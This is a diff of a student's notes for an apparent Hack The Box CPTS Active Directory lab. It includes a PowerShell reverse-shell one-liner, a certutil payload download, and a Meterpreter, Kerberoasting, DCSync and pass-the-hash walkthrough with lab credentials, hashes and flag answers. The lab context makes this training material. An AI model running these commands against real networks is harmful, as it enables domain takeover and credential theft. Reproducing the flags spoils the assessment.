@@ -7,7 +7,10 @@ Apply what you learned in this module to compromise the domain and answer the qu
 xfreerdp /v:10.129.2.44 /u:htb-student /p:HTB_@cademy_stdnt! /drive:shared,/home/htb-ac-1235531/Desktop
 
 
-$client = New-Object System.Net.Sockets.TCPClient('10.10.14.128',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+$client = New-Object System.Net.Sockets.TCPClient('10.10.15.183',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+
+certutil.exe -f -urlcache -split http://10.10.15.183:8000/PowerView.ps1 PowerView.ps1
 
 
 Question 1 - Submit the contents of the flag.txt file on the administrator Desktop of the web server - JusT_g3tt1ng_st@rt3d!
@@ -98,3 +101,274 @@ krbtgt: Credentials:
     lm  - 0: 71f5354fb6fbe151714f6721f59011dd
 
 i literally hate HTB labs dude.. i have 3 ways to complete this and of course none are working :] basically we need proxychains or portfwd to actually work, then we just take all the info we found and either past the ticket with impacket OR evilwinrm but none are working so cool. 
+
+
+# 💥 CPTS Skills Assessment – Meterpreter Walkthrough (Full Flow)
+
+---
+
+## 🧠 Goal
+
+Compromise the Active Directory domain using enumeration, Kerberoasting, LSA dumping, DCSync, and lateral movement.
+
+---
+
+## ⚔️ Step 1 – Initial Access with Antak Webshell
+
+- Go to: `http://<target-ip>/uploads/antak.aspx`
+- Use `msfconsole` for a reverse shell with `web_delivery`:
+
+```bash
+sudo msfconsole
+use exploit/multi/script/web_delivery
+set target 2
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.15.183
+set LPORT 4445
+set URIPATH /
+exploit -j
+
+Copy the obfuscated PowerShell command.
+
+Paste it into Antak → Catch the meterpreter shell!
+
+🧱 Step 2 – Migrate to a Stable Process
+Inside meterpreter:
+ps
+getpid
+migrate <pid_of_winlogon.exe>
+
+✅ You should now be SYSTEM-level and stable.
+
+🔎 Step 3 – SPN Enumeration for Kerberoasting
+Still inside the meterpreter shell:
+shell
+certutil.exe -f -urlcache -split http://10.10.15.183:8000/PowerView.ps1 PowerView.ps1
+powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -SPN | select samaccountname
+
+🟢 Found: svc_sql
+
+🔓 Step 4 – Dump Kerberoastable Hash
+
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat
+📥 Copy the full $krb5tgs$23$... hash
+
+🪓 Step 5 – Crack with Hashcat
+hashcat -m 13100 <hash> /usr/share/wordlists/rockyou.txt
+
+🟢 Password = lucky7
+
+
+📡 Set Up Pivoting
+1. Run autoroute inside meterpreter:
+run autoroute -s 172.16.6.0/24
+
+2. Background session:
+background
+
+🔍 Port Scan Internal Network
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 172.16.6.0/24
+set PORTS 139,445
+set THREADS 50
+run
+
+🔎 Found RDP open on: 172.16.6.50
+
+🖥️ RDP into MS01
+proxychains xfreerdp /v:172.16.6.50 /u:tpetty /p:Sup3rS3cur3D0m@inU2eR /cert-ignore +clipboard /drive:shared,/home/kali/Desktop    <- we can actually skip this step... 
+
+🔐 Validate DCSync Rights (Question 7)
+powershell
+Import-Module .\PowerView.ps1
+$sid = Convert-NameToSid tpetty
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -match "Replication-Get" } | ? { $_.SecurityIdentifier -match $sid } | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
+
+✅ Confirmed:
+
+DS-Replication-Get
+
+DS-Replication-Get-Changes
+
+DS-Replication-Get-Changes-In-Filtered-Set
+
+✅ Buck, if you see those 3 permissions on your target SID: you're greenlit for DCSync.
+
+
+🧪 Question 8 — Final Domain Compromise
+1. Proxychains SOCKS setup:
+use auxiliary/server/socks_proxy
+run
+
+sudo nano /etc/proxychains.conf
+# Add at the bottom:
+socks5 127.0.0.1 1080
+!! be sure to put # infront of socks4 
+
+Students need to dump autologon passwords in clear text using crackmapexec, finding the password Sup3rS3cur3D0m@inU2eR from the credentials tpetty:Sup3rS3cur3D0m@inU2eR:
+🧠 Dump Domain Secrets
+sudo proxychains cme smb 172.16.6.50 -u svc_sql -p lucky7
+
+⚔️ Final Shell to DC01 with Hash
+proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7 --lsa
+
+
+🔐 Validate DCSync Rights (Question 7)
+powershell
+Import-Module .\PowerView.ps1
+$sid = Convert-NameToSid tpetty
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { $_.ObjectAceType -match "Replication-Get" } | ? { $_.SecurityIdentifier -match $sid } | select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
+
+✅ Confirmed:
+
+DS-Replication-Get
+
+DS-Replication-Get-Changes
+
+DS-Replication-Get-Changes-In-Filtered-Set
+
+✅ Buck, if you see those 3 permissions on your target SID: you're greenlit for DCSync.
+
+⚔️ Final Shell to DC01 with Hash
+Students need to perform a DCSync attack to obtain the hash for for administrator on DC01:
+proxychains secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator
+
+Subsequently, students need to use wmiexec.py as administrator and pass the hash found from command above ^^  aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0 to be able to connect to DC01. Students will find the flag in C:\users\administrator\desktop\flag.txt:
+
+┌─[us-academy-2]─[10.10.14.204]─[htb-ac543@htb-g4gbrbdlht]─[~]
+└──╼ [★]$ proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
+
+ProxyChains-3.1 (http://proxychains.sf.net)
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+
+|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:445-<><>-OK
+[*] SMBv3.0 dialect used
+|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:135-<><>-OK
+|S-chain|-<>-127.0.0.1:1080-<><>-172.16.6.3:49774-<><>-OK
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\>hostname
+DC01
+
+C:\>type c:\users\administrator\desktop\flag.txt
+r3plicat1on_m@st3r!
+
+
+
+## ⚔️ CPTS Skills Assessment – Meterpreter-Only Flow (Sanity Check Run)
+
+---
+
+### ⚔️ Step 1 – Initial Access with Antak Webshell
+
+- Navigate to: `http://<target-ip>/uploads/antak.aspx`
+
+- Use `msfconsole` for a reverse shell:
+
+```bash
+sudo msfconsole
+use exploit/multi/script/web_delivery
+set target 2
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.15.183
+set LPORT 4445
+set URIPATH /
+exploit -j
+Copy the obfuscated PowerShell command
+
+Paste it into Antak → Catch the meterpreter shell!
+
+🧱 Step 2 – Migrate to a Stable Process
+Inside meterpreter:
+
+ps
+getpid
+migrate <PID-of-winlogon.exe>
+✅ You should now be SYSTEM-level and stable.
+
+🔎 Step 3 – SPN Enumeration for Kerberoasting
+
+shell
+certutil.exe -f -urlcache -split http://10.10.15.183:8000/PowerView.ps1 PowerView.ps1
+powershell
+Import-Module .\PowerView.ps1
+Get-DomainUser * -SPN | select samaccountname
+🟢 Found: svc_sql
+
+🔓 Step 4 – Dump Kerberoastable Hash
+
+Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat
+📥 Copy the full $krb5tgs$23$... hash
+
+🪓 Step 5 – Crack with Hashcat
+
+hashcat -m 13100 <hash> /usr/share/wordlists/rockyou.txt
+🟢 Password = lucky7
+
+📡 Step 6 – Set Up Pivoting
+
+run autoroute -s 172.16.6.0/24
+background
+🔍 Step 7 – Port Scan Internal Network
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 172.16.6.0/24
+set PORTS 139,445
+set THREADS 50
+run
+🔎 Found RDP open on: 172.16.6.50
+
+🔐 Step 8 – Dump Cleartext Creds with CME
+Set up proxychains:
+
+
+use auxiliary/server/socks_proxy
+run
+Edit config:
+
+
+sudo nano /etc/proxychains.conf
+# At bottom:
+socks5 127.0.0.1 1080
+# Be sure to comment out any socks4 lines
+Dump creds:
+
+
+sudo proxychains crackmapexec smb 172.16.6.50 -u svc_sql -p lucky7
+🧠 Found: tpetty:Sup3rS3cur3D0m@inU2eR
+
+🧠 Step 9 – Validate DCSync Rights
+
+powershell
+Import-Module .\PowerView.ps1
+$sid = Convert-NameToSid tpetty
+Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs |
+? { $_.ObjectAceType -match "Replication-Get" } |
+? { $_.SecurityIdentifier -match $sid } |
+select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType | fl
+✅ Confirmed:
+
+DS-Replication-Get
+
+DS-Replication-Get-Changes
+
+DS-Replication-Get-Changes-In-Filtered-Set
+
+✅ Buck, if you see those 3 permissions on your target SID: you're golden for DCSync.
+
+🧪 Step 10 – Dump Administrator Hash via DCSync
+
+proxychains secretsdump.py INLANEFREIGHT/tpetty@172.16.6.3 -just-dc-user administrator
+🟢 Get the NTLM hash of Administrator
+
+⚔️ Step 11 – Remote Shell with WMIXec (PtH)
+
+proxychains wmiexec.py administrator@172.16.6.3 -hashes aad3b435b51404eeaad3b435b51404ee:27dedb1dab4d8545c6e1c66fba077da0
+Then inside shell:
+
+
+hostname
+type C:\Users\Administrator\Desktop\flag.txt
+🟩 Final Flag: r3plicat1on_m@st3r!
